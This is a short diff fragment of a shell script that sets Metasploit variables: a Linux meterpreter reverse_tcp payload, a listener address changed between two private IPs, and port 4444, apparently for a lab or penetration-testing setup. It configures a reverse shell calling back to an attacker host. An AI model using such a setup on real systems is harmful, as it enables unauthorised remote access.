@@ -2,7 +2,7 @@
 
 # Set the payload and connection details as variables
 PAYLOAD="linux/x86/meterpreter/reverse_tcp"
-LHOST="192.168.1.124"
+LHOST="192.168.10.10"
 LPORT="4444"
 
 echo "
